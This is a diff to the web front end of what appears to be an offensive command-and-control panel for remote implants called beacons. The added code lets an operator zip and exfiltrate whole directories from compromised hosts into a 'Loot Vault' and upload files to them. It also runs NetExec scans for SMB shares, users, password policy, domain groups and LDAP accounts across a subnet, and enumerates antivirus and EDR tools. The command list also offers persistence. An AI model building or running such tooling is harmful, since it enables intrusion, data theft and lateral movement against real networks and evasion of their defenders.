+  if(!rows.length){ body.innerHTML='<div class="t-output">'+esc(last.output||"(no output)")+'</div>'; return; }
+
+  const listen = rows.filter(r => /LISTEN/i.test(r.state));
+  const established = rows.filter(r => /ESTABLISH/i.test(r.state));
+  const other = rows.filter(r => !/LISTEN|ESTABLISH/i.test(r.state));
+  const warnCount = rows.filter(r => {
+    const lp = extractPort(r.local), rp = extractPort(r.remote);
+    return (lp && NET_SUSPICIOUS.has(lp)) || (rp && NET_SUSPICIOUS.has(rp));
+  }).length;
+
+  let html = '<div class="ns-summary">'
+    +'<div class="ns-stat"><span class="ns-num">'+rows.length+'</span><span class="ns-lbl">Total</span></div>'
+    +'<div class="ns-stat listen"><span class="ns-num">'+listen.length+'</span><span class="ns-lbl">Listening</span></div>'
+    +'<div class="ns-stat active"><span class="ns-num">'+established.length+'</span><span class="ns-lbl">Established</span></div>';
+  if(warnCount) html += '<div class="ns-stat warn"><span class="ns-num">'+warnCount+'</span><span class="ns-lbl">⚠ Suspicious</span></div>';
+  html += '</div>';
+
+  function renderSection(title, items){
+    if(!items.length) return "";
+    let s = '<div class="ns-section"><div class="ns-title">'+title+' ('+items.length+')</div>';
+    s += '<table class="ns-table"><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>State</th><th>Process</th><th>Assessment</th></tr></thead><tbody>';
+    for(const r of items){
+      const tags = assessConn(r);
+      const hasWarn = tags.some(t => t.cls==="warn");
+      s += '<tr class="'+(hasWarn?"ns-row-warn":"")+'"><td>'+esc(r.proto)+'</td>'
+        +'<td class="ns-addr">'+esc(r.local)+'</td>'
+        +'<td class="ns-addr">'+esc(r.remote)+'</td>'
+        +'<td>'+esc(r.state)+'</td>'
+        +'<td>'+esc(r.proc)+'</td>'
+        +'<td>'+tags.map(t=>'<span class="ns-tag '+t.cls+'">'+t.text+'</span>').join("")+'</td></tr>';
+    }
+    s += '</tbody></table></div>';
+    return s;
+  }
+
+  html += renderSection("Listening", listen);
+  html += renderSection("Established", established);
+  html += renderSection("Other", other);
   body.innerHTML = html;
 }
 
@@ -1646,18 +2774,20 @@ function fbRenderList(){
     if(ftype && !isDir) html += '<span class="ftype '+esc(ftype)+'">'+esc(ftype)+'</span>';
     html += '<span class="size">'+esc(sizeStr)+'</span>'
       +'<span class="mtime">'+esc(mtime)+'</span>';
-    if(!isDir){
-      html += '<span class="actions">'
-        +'<button onclick="event.stopPropagation();fbDownloadFile(\''+esc(fullPath.replace(/'/g,"\\'"))+'\')">&#11015;</button>'
-        +'<button onclick="event.stopPropagation();document.getElementById(\'cmd-input\').value=\'cat '+esc(fullPath)+'\';document.getElementById(\'cmd-input\').focus()">&#128065;</button>'
-        +'</span>';
+    html += '<span class="actions">';
+    if(isDir){
+      html += '<button onclick="event.stopPropagation();fbLootDir(\''+esc(fullPath.replace(/'/g,"\\'"))+'\')">&#128142;</button>';
+    } else {
+      html += '<button onclick="event.stopPropagation();fbDownloadFile(\''+esc(fullPath.replace(/'/g,"\\'"))+'\')">&#11015;</button>'
+        +'<button onclick="event.stopPropagation();document.getElementById(\'cmd-input\').value=\'cat '+esc(fullPath)+'\';document.getElementById(\'cmd-input\').focus()">&#128065;</button>';
     }
+    html += '</span>';
     html += '<span class="perm">'+esc(f.mode||"")+'</span>';
     entry.innerHTML = html;
 
     entry.onclick = e => {
       if(e.target.closest(".actions")) return;
-      if(isDir){ fbLoadDir(fullPath); return; }
+      if(isDir && !e.ctrlKey){ fbLoadDir(fullPath); return; }
       fbSelected = f;
       fbShowDetail(f, fullPath);
       list.querySelectorAll(".fb-entry").forEach(el => el.classList.remove("selected"));
@@ -1687,7 +2817,101 @@ function fbShowDetail(f, fullPath){
   if(f.is_link) html += '<span class="fd-lbl">Link</span><span class="fd-val warn">→ '+esc(f.link_target||"?")+'</span>';
   if(f.type==="cert") html += '<span class="fd-lbl">⚠</span><span class="fd-val warn">Certificate / Key file</span>';
   html += '</div>';
+  const ep = esc(fullPath.replace(/'/g,"\\'"));
+  html += '<div class="fd-actions">';
+  if(f.is_dir){
+    html += '<button class="fd-btn loot" onclick="fbLootDir(\''+ep+'\')">&#128142; Loot (zip)</button>';
+    html += '<button class="fd-btn" onclick="fbLoadDir(\''+ep+'\')">&#128194; Open</button>';
+  } else {
+    html += '<button class="fd-btn dl" onclick="fbDownloadFile(\''+ep+'\')">&#11015; Download</button>';
+    html += '<button class="fd-btn" onclick="document.getElementById(\'cmd-input\').value=\'cat '+ep+'\';document.getElementById(\'cmd-input\').focus()">&#128065; View</button>';
+  }
+  html += '<button class="fd-btn up" onclick="fbUploadTo(\''+ep+'\')">&#11014; Upload here</button>';
+  html += '</div>';
   detail.innerHTML = html;
+}
+
+function fbDownloadFile(path){
+  if(!selectedAgent) return;
+  const inp = document.getElementById("cmd-input");
+  inp.value = "download " + path;
+  sendCmd();
+}
+
+function fbLootDir(path){
+  if(!selectedAgent) return;
+  const inp = document.getElementById("cmd-input");
+  inp.value = "loot " + path;
+  sendCmd();
+}
+
+function fbUploadTo(path){
+  if(!selectedAgent) return;
+  const input = document.createElement("input");
+  input.type = "file";
+  input.onchange = async () => {
+    const file = input.files[0];
+    if(!file) return;
+    const reader = new FileReader();
+    reader.onload = () => {
+      const b64 = reader.result.split(",")[1];
+      const dest = path.endsWith("/") ? path + file.name : path + "/" + file.name;
+      const inp = document.getElementById("cmd-input");
+      inp.value = "upload " + dest + " " + b64;
+      sendCmd();
+    };
+    reader.readAsDataURL(file);
+  };
+  input.click();
+}
+
+async function showLootViewer(){
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  panel.innerHTML = '<h2>&#128142; Loot Vault</h2><div class="loot-loading">Loading...</div>';
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+  try {
+    const items = await api("/api/loot");
+    if(!items.length){
+      panel.innerHTML = '<h2>&#128142; Loot Vault</h2><p class="loot-empty">No loot collected yet. Use the file browser to loot directories.</p>';
+      return;
+    }
+    let html = '<h2>&#128142; Loot Vault</h2><button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">✕</button><div class="loot-list">';
+    items.forEach(item => {
+      const sizeStr = item.size > 1048576 ? (item.size/1048576).toFixed(1)+" MB" : (item.size/1024).toFixed(1)+" KB";
+      const icon = item.filename.endsWith(".zip") ? "📦" : "📄";
+      const dlUrl = "/api/loot/"+encodeURIComponent(item.agent_id)+"/"+encodeURIComponent(item.filename);
+      html += '<div class="loot-item">'
+        + '<span class="loot-ico">'+icon+'</span>'
+        + '<div class="loot-info">'
+        + '<a class="loot-name" href="#" onclick="event.preventDefault();lootSave(\''+esc(dlUrl)+'\',\''+esc(item.filename)+'\')">'+esc(item.filename)+'</a>'
+        + '<span class="loot-meta">'+esc(item.agent_id)+' &middot; '+sizeStr+(item.type==="download"?" &middot; download":"")+'</span>'
+        + '</div>'
+        + '<button class="loot-dl" onclick="lootSave(\''+esc(dlUrl)+'\',\''+esc(item.filename)+'\')" title="Download">⬇</button>'
+        + '</div>';
+    });
+    html += '</div>';
+    panel.innerHTML = html;
+  } catch(e) {
+    panel.innerHTML = '<h2>&#128142; Loot Vault</h2><p class="loot-empty">Error loading loot: '+esc(e.message)+'</p>';
+  }
+}
+
+async function lootSave(url, filename){
+  try {
+    const r = await fetch(url, {headers:H});
+    if(!r.ok){ toast("warn","Loot","Download failed: "+r.status,3000); return; }
+    const blob = await r.blob();
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    a.click();
+    URL.revokeObjectURL(a.href);
+  } catch(e){ toast("warn","Loot","Download error: "+e.message,3000); }
 }
 
 function fbUpdateTree(){
@@ -1909,38 +3133,42 @@ function renderLogEntries(entries, container){
   container.scrollTop = container.scrollHeight;
 }
 
-async function showServerLog(){
+function showServerLog(){
+  const drawer = document.getElementById("srvlog-drawer");
+  if(drawer.classList.contains("open")){ closeSrvLog(); return; }
   if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
   logFilter = "";
-  openPanel("Server Log", `
-    <div class="log-controls">
-      <button class="active" onclick="setLogFilter('')">All</button>
-      <button onclick="setLogFilter('REGISTER')">Register</button>
-      <button onclick="setLogFilter('RECONNECT')">Reconnect</button>
-      <button onclick="setLogFilter('TASK')">Task</button>
-      <button onclick="setLogFilter('DISPATCH')">Dispatch</button>
-      <button onclick="setLogFilter('RESULT')">Result</button>
-      <button onclick="setLogFilter('DOWNLOAD')">Download</button>
-      <button onclick="setLogFilter('STARTUP')">Startup</button>
-      <span style="flex:1"></span>
-      <button onclick="refreshServerLog()">&#8635; Refresh</button>
-    </div>
-    <div id="log-entries" style="flex:1;overflow-y:auto;min-height:0"></div>
-  `);
+  const ctrl = document.getElementById("srvlog-controls");
+  ctrl.innerHTML = '<button class="active" onclick="setLogFilter(\'\')">All</button>'
+    +'<button onclick="setLogFilter(\'REGISTER\')">Register</button>'
+    +'<button onclick="setLogFilter(\'RECONNECT\')">Reconnect</button>'
+    +'<button onclick="setLogFilter(\'TASK\')">Task</button>'
+    +'<button onclick="setLogFilter(\'DISPATCH\')">Dispatch</button>'
+    +'<button onclick="setLogFilter(\'RESULT\')">Result</button>'
+    +'<button onclick="setLogFilter(\'DOWNLOAD\')">Download</button>'
+    +'<button onclick="setLogFilter(\'STARTUP\')">Startup</button>'
+    +'<span style="flex:1"></span>'
+    +'<button onclick="refreshServerLog()">&#8635;</button>';
+  drawer.classList.add("open");
   refreshServerLog();
   logPollTimer = setInterval(refreshServerLog, 5000);
+}
+
+function closeSrvLog(){
+  document.getElementById("srvlog-drawer").classList.remove("open");
+  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
 }
 
 async function refreshServerLog(){
   const url = "/api/logs/server" + (logFilter ? "?cat="+logFilter : "");
   const entries = await api(url);
-  const container = document.getElementById("log-entries");
+  const container = document.getElementById("srvlog-body");
   if(container) renderLogEntries(entries, container);
 }
 
 function setLogFilter(cat){
   logFilter = cat;
-  document.querySelectorAll(".log-controls button").forEach(b => {
+  document.querySelectorAll(".srvlog-controls button").forEach(b => {
     const isCat = (cat === "" && b.textContent === "All") ||
                   b.textContent.toUpperCase() === cat;
     b.classList.toggle("active", isCat);
@@ -2017,6 +3245,7 @@ async function showPivotMap(){
     <div class="pivot-controls">
       <button onclick="runNetScan()">&#128269; Scan Subnet</button>
       <button onclick="runArpScan()">&#128203; ARP Table</button>
+      <button onclick="showNxcMenu(this)">&#9876; NXC Scan</button>
       <button onclick="refreshPivotMap()">&#8635; Refresh</button>
       <span style="flex:1"></span>
       <button onclick="pivotZoomIn()" title="Zoom in">&#10133;</button>
@@ -2670,6 +3899,71 @@ async function runArpScan(){
   pollHistory(selectedAgent);
 }
 
+function showNxcMenu(btn){
+  let menu = document.getElementById("nxc-menu");
+  if(menu){ menu.remove(); return; }
+  const scanResults = pivotScanData[selectedAgent] || [];
+  const hosts = scanResults.map(h => h.ip);
+  const subnet = hosts.length ? hosts[0].split(".").slice(0,3).join(".")+".0/24" : "";
+  menu = document.createElement("div");
+  menu.id = "nxc-menu";
+  menu.className = "nxc-menu";
+  let html = '<div class="nxc-title">NetExec Scans</div>';
+  html += '<div class="nxc-section">Subnet Discovery</div>';
+  html += '<button onclick="nxcRun(\'smb\',\''+esc(subnet)+'\',\'\')">SMB hosts (signing, OS)</button>';
+  html += '<button onclick="nxcRun(\'rdp\',\''+esc(subnet)+'\',\'\')">RDP hosts (NLA, screenshot)</button>';
+  html += '<button onclick="nxcRun(\'winrm\',\''+esc(subnet)+'\',\'\')">WinRM hosts</button>';
+  html += '<button onclick="nxcRun(\'ssh\',\''+esc(subnet)+'\',\'\')">SSH hosts</button>';
+  html += '<button onclick="nxcRun(\'mssql\',\''+esc(subnet)+'\',\'\')">MSSQL instances</button>';
+  html += '<div class="nxc-section">Enumeration (select host)</div>';
+  html += '<div class="nxc-host-pick"><select id="nxc-target">';
+  if(!hosts.length) html += '<option value="">No hosts discovered</option>';
+  hosts.forEach(ip => { html += '<option value="'+esc(ip)+'">'+esc(ip)+'</option>'; });
+  html += '</select></div>';
+  html += '<button onclick="nxcTargetRun(\'smb\',\'--shares\')">SMB Shares</button>';
+  html += '<button onclick="nxcTargetRun(\'smb\',\'--users\')">SMB Users</button>';
+  html += '<button onclick="nxcTargetRun(\'smb\',\'--sessions\')">SMB Sessions</button>';
+  html += '<button onclick="nxcTargetRun(\'smb\',\'--pass-pol\')">Password Policy</button>';
+  html += '<button onclick="nxcTargetRun(\'smb\',\'--groups\')">Domain Groups</button>';
+  html += '<button onclick="nxcTargetRun(\'ldap\',\'--active-users\')">Active LDAP Users</button>';
+  html += '<div class="nxc-section">AV/EDR Enum (server-side, Impacket)</div>';
+  html += '<button onclick="showAvEnumDialog()">🛡️ Remote AV/EDR Scan</button>';
+  html += '<div class="nxc-section">Custom</div>';
+  html += '<div class="nxc-custom"><input id="nxc-custom-args" placeholder="e.g. smb 10.0.0.0/24 --gen-relay-list /tmp/r.txt" style="width:100%"><button onclick="nxcCustomRun()">Run</button></div>';
+  html += '<div class="nxc-note">Requires nxc/netexec on beacon host</div>';
+  menu.innerHTML = html;
+  btn.parentElement.appendChild(menu);
+  document.addEventListener("click", function closeNxc(e){
+    if(!e.target.closest("#nxc-menu") && !e.target.closest("[onclick*=showNxcMenu]")){
+      const m = document.getElementById("nxc-menu");
+      if(m) m.remove();
+      document.removeEventListener("click", closeNxc);
+    }
+  });
+}
+
+function nxcRun(proto, target, flags){
+  if(!selectedAgent || !target) return;
+  const cmd = 'nxc '+proto+' '+target+(flags?' '+flags:'');
+  document.getElementById("nxc-menu")?.remove();
+  toast("info","NXC","Running: "+cmd,4000);
+  quickCmd('shell', cmd, 'NXC: '+proto+' scan');
+}
+
+function nxcTargetRun(proto, flags){
+  const target = document.getElementById("nxc-target")?.value;
+  if(!target){ toast("warn","NXC","Select a target host first",3000); return; }
+  nxcRun(proto, target, flags);
+}
+
+function nxcCustomRun(){
+  const args = document.getElementById("nxc-custom-args")?.value?.trim();
+  if(!args){ toast("warn","NXC","Enter nxc arguments",3000); return; }
+  document.getElementById("nxc-menu")?.remove();
+  toast("info","NXC","Running: nxc "+args,4000);
+  quickCmd('shell', 'nxc '+args, 'NXC: custom');
+}
+
 async function pollNetScanResult(){
   if(!selectedAgent) return;
   const hist = await api("/api/agents/"+selectedAgent+"/history");
@@ -2777,6 +4071,9 @@ const AC_COMMANDS = [
   {cmd:"unpersist", hint:"Remove persistence", args:true},
   {cmd:"netscan", hint:"Scan local subnet", args:true},
   {cmd:"arptable", hint:"Show ARP neighbors", args:false},
+  {cmd:"proxyinfo", hint:"Show proxy configuration", args:false},
+  {cmd:"avenum", hint:"Enumerate AV/EDR/SIEM tools", args:false},
+  {cmd:"loot", hint:"Loot directory (recursive zip)", args:true},
   {cmd:"kill", hint:"Terminate beacon", args:false},
 ];
 
